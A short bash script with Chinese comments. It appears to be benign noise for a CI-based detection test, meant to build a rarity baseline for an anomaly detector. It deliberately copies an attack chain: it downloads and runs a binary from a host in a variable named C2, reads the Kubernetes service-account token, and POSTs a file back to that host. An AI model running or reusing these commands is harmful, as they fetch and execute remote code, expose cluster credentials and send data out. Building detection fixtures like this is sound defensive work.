#!/usr/bin/env bash
# 良性构建步骤（真实执行，被 benign-ci-noise 反复调用建立罕见度基线）。
# 故意与攻击同形：真实下载/落可执行/chmod/执行/读凭据/外联——这些都产生真实系统调用，
# 但对 ci 工作负载是日常 → 全局罕见度 ≈ 0 → 不得成案。
set -uo pipefail
C2="${C2:-10.66.0.99}"

curl -s "http://$C2:8080/deps.tar" -o /tmp/deps.tar           # 真实下载 (connect/open/write)
mkdir -p /tmp/build && tar xf /tmp/deps.tar -C /tmp/build      # 真实解包
cp /tmp/build/tool /tmp/tool && chmod +x /tmp/tool            # 真实落可执行 (write/chmod)
/tmp/tool --build                                             # 真实执行 (exec)
cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 || true  # 真实读凭据
curl -s -X POST --data-binary @/tmp/tool "http://$C2:8080/upload" -o /dev/null || true  # 真实外联
echo "[ci] build cycle done"
